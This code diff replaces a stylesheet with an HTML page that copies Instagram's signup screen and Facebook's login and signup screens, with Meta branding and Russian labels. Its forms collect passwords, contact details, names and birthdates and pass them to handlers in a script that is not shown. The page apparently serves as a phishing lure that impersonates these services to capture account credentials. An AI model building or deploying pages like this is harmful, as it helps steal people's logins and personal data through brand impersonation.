@@ -1,96 +1,102 @@
-body {
-    background-color: #000;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    font-family: sans-serif;
-    margin: 0;
-}
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration System</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
 
-.container {
-    width: 400px;
-    padding: 25px;
-    border-radius: 12px;
-    text-align: center;
-}
+    <!-- 1. INSTAGRAM RO'YXATDAN O'TISH (1-rasm) -->
+    <div id="insta-reg" class="container dark-theme">
+        <div class="meta-logo">Meta</div>
+        <h2>Зарегистрируйтесь в Instagram</h2>
+        <p class="subtitle">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
+        
+        <form onsubmit="redirectToInsta(event)">
+            <div class="input-group">
+                <label>Мобильный телефон или электронный адрес</label>
+                <input type="text" id="insta-contact" required>
+            </div>
+            <div class="input-group">
+                <label>Пароль</label>
+                <input type="password" id="insta-pass" required>
+            </div>
+            
+            <div class="date-row">
+                <label>Дата рождения</label>
+                <div class="select-wrapper">
+                    <select id="insta-day"></select>
+                    <select id="insta-month"></select>
+                    <select id="insta-year"></select>
+                </div>
+            </div>
 
-/* Dark Theme (Instagram) */
-.dark-theme {
-    background-color: #121212;
-    color: #fff;
-    border: 1px solid #333;
-}
+            <div class="input-group">
+                <label>Название (Имя и фамилия)</label>
+                <input type="text" id="insta-name" required>
+            </div>
+            <div class="input-group">
+                <label>Имя пользователя</label>
+                <input type="text" id="insta-username" required>
+            </div>
 
-/* Light Theme (Facebook) */
-.light-theme {
-    background-color: #fff;
-    color: #000;
-}
+            <button type="submit" class="blue-btn">Отправить</button>
+            <button type="button" class="outline-btn" onclick="showPage('fb-login')">Войти через Facebook</button>
+        </form>
+    </div>
 
-.input-group, .input-row {
-    margin-bottom: 15px;
-    text-align: left;
-}
+    <!-- 2. FACEBOOK LOGIN (5-rasm) -->
+    <div id="fb-login" class="container light-theme" style="display:none;">
+        <h2 class="fb-blue-text">Войдите на Facebook</h2>
+        <form>
+            <input type="text" placeholder="Электронный адрес или номер телефона" class="fb-input">
+            <input type="password" placeholder="Пароль" class="fb-input">
+            <button type="button" class="fb-blue-btn">Войти</button>
+            <a href="#" class="fb-link">Забыли пароль?</a>
+            <div class="divider"></div>
+            <button type="button" class="fb-green-btn" onclick="showPage('fb-reg')">Создать новый аккаунт</button>
+        </form>
+        <div class="meta-footer">Meta</div>
+    </div>
 
-input, select {
-    width: 100%;
-    padding: 12px;
-    border-radius: 6px;
-    border: 1px solid #333;
-    background: #1e1e1e;
-    color: white;
-    margin-top: 5px;
-}
+    <!-- 3. FACEBOOK REGISTRATION (6-rasm) -->
+    <div id="fb-reg" class="container light-theme" style="display:none;">
+        <h2>Начните пользоваться Facebook</h2>
+        <p>Создайте аккаунт для общения с друзьями...</p>
+        
+        <form onsubmit="redirectToFB(event)">
+            <div class="input-row">
+                <input type="text" placeholder="Имя" id="fb-fname" required>
+                <input type="text" placeholder="Фамилия" id="fb-lname" required>
+            </div>
+            
+            <div class="date-row">
+                <label>Дата рождения</label>
+                <div class="select-wrapper">
+                    <select id="fb-day"></select>
+                    <select id="fb-month"></select>
+                    <select id="fb-year"></select>
+                </div>
+            </div>
 
-.light-theme input, .light-theme select {
-    background: #f5f6f7;
-    color: #000;
-    border: 1px solid #ddd;
-}
+            <div class="input-group">
+                <select id="fb-gender">
+                    <option>Выберите пол</option>
+                    <option>Мужской</option>
+                    <option>Женский</option>
+                </select>
+            </div>
 
-.select-wrapper {
-    display: flex;
-    gap: 10px;
-}
+            <input type="text" placeholder="Номер или эл. адрес" class="fb-input" id="fb-contact">
+            <input type="password" placeholder="Пароль" class="fb-input" id="fb-pass">
 
-.blue-btn {
-    background: #0095f6;
-    color: white;
-    border: none;
-    width: 100%;
-    padding: 10px;
-    border-radius: 8px;
-    font-weight: bold;
-    cursor: pointer;
-}
+            <button type="submit" class="fb-blue-btn">Отправить</button>
+            <button type="button" class="outline-btn" onclick="showPage('insta-reg')">У меня уже есть аккаунт</button>
+        </form>
+    </div>
 
-.fb-blue-btn {
-    background: #1877f2;
-    color: white;
-    width: 100%;
-    padding: 12px;
-    border-radius: 6px;
-    border: none;
-    font-size: 16px;
-    font-weight: bold;
-}
-
-.fb-green-btn {
-    background: #42b72a;
-    color: white;
-    border: none;
-    padding: 10px 20px;
-    border-radius: 6px;
-    font-weight: bold;
-}
-
-.outline-btn {
-    background: transparent;
-    color: #a8a8a8;
-    border: 1px solid #333;
-    width: 100%;
-    margin-top: 10px;
-    padding: 8px;
-    cursor: pointer;
-}
+    <script src="script.js"></script>
+</body>
+</html>
